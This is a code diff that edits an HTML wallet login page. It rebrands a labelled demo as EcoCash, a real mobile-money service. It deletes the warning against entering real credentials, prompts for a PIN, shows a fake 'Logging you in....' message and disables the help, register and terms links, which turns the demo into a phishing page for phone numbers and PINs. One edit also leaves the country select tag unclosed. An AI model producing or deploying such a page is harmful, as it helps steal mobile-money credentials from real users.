@@ -268,15 +268,14 @@ h3 {
     <div class="top-section">
 
         <div class="logo">
-            <span>My</span><span>Wallet</span>
+            <span>Eco</span><span>Cash</span>
         </div>
 
         <h3>Login</h3>
 
         <div class="phone-box">
 
-            <select id="country">
-                <option value="+254">🇰🇪 +254</option>
+            <select id="country"
                 <option value="+263">🇿🇼 +263</option>
                 <option value="+256">🇺🇬 +256</option>
                 <option value="+255">🇹🇿 +255</option>
@@ -287,14 +286,13 @@ h3 {
             <input
                 type="tel"
                 id="phone"
-                placeholder="Demo Phone Number"
                 inputmode="numeric"
                 autocomplete="off"
             >
 
         </div>
 
-        <div class="hint">Enter your demo access code</div>
+        <div class="hint">Enter your PIN</div>
 
         <div class="pin-container">
             <input type="password" maxlength="1" inputmode="numeric" autocomplete="off">
@@ -304,7 +302,7 @@ h3 {
         </div>
 
         <div class="notice">
-            Demo interface only. Do not enter real account credentials.
+        Logging you in....
         </div>
 
     </div>
@@ -312,18 +310,17 @@ h3 {
     <div class="bottom-section">
 
         <p>
-            To explore this wallet demo or get assistance,<br>
-            click below
+            To register an ecocash wallet or get assistance, click below 
         </p>
 
         <div class="buttons">
 
-            <button class="action-btn" onclick="showModal('register')">
+            <button class="action-btn" disable="showModal('register')">
                 <span class="symbol">♟</span>
                 Register
             </button>
 
-            <button class="action-btn" onclick="showModal('help')">
+            <button class="action-btn" disable="showModal('help')">
                 <span class="symbol">ⓘ</span>
                 Help & Support
             </button>
@@ -333,7 +330,7 @@ h3 {
         <div class="version">
             v1.0 DEMO<br>
             By continuing, you agree to the
-            <a href="#" onclick="showModal('terms');return false;">Terms and Conditions</a>
+            <a href="#" disable="showModal('terms');return false;">Terms and Conditions</a>
         </div>
 
     </div>
@@ -344,7 +341,7 @@ h3 {
     <div class="modal-content">
         <h3 id="modal-title">Information</h3>
         <p id="modal-message"></p>
-        <button class="close-btn" onclick="closeModal()">Close</button>
+        <button class="close-btn" disable="closeModal()">Close</button>
     </div>
 </div>
 
